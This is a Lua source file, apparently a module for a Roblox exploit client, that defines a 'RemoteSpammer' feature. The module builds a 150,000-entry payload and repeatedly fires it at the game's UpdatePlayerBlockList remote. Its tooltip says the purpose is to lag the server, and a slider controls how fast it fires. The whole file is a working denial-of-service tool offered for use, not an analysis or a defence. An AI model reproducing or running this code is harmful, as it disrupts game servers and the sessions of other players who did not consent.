local RemoteSpammer
local Threshold
local PAYLOAD_SIZE = 150000

local function getRemote()
	local container = game:FindFirstChild('RobloxReplicatedStorage')
	local remote = container and container:FindFirstChild('UpdatePlayerBlockList')
	return remote and cloneref(remote)
end

RemoteSpammer = vape.Categories.World:CreateModule({
	Name = 'RemoteSpammer',
	Function = function(callback)
		if callback then
			-- built once per enable, the size is what makes each fire expensive
			local payload = table.create(PAYLOAD_SIZE)
			for index = 1, PAYLOAD_SIZE do
				payload[index] = {id = index, v = index * 2}
			end

			local fireDelay = os.clock()
			notif('RemoteSpammer', 'Spamming the block list remote.', 5)

			repeat
				local remote = getRemote()
				local now = os.clock()
				if remote and fireDelay < now then
					fireDelay = now + Threshold.Value
					-- a payload this large can be rejected, which must not kill the spam
					pcall(remote.FireServer, remote, payload)
				end

				runService.Heartbeat:Wait()
			until not RemoteSpammer.Enabled
		end
	end,
	Tooltip = 'Spams the UpdatePlayerBlockList remote with a huge payload to lag the server.'
})
Threshold = RemoteSpammer:CreateSlider({
	Name = 'Threshold',
	Min = 0,
	Max = 1,
	Default = 0.1,
	Decimal = 100,
	Tooltip = 'Seconds between each fire, 0 fires as fast as the loop runs.'
})
